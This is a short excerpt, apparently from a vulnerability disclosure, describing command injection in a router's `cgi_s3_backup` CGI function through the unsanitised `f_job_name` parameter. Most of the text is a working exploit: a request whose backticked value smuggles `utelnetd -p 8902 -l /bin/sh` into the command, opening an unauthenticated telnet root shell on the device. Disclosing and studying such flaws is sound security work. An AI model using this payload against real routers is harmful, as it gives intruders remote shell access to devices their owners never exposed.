...
In `cgi_s3_backup` function, `f_job_name` is directly passed by the attacker, so we can control the `f_job_name` to attack the OS.
...
We set `f_job_name` as **`utelnetd -p 8902 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_s3_backup&f_job_name=`utelnetd -p 8902 -l /bin/sh`
```
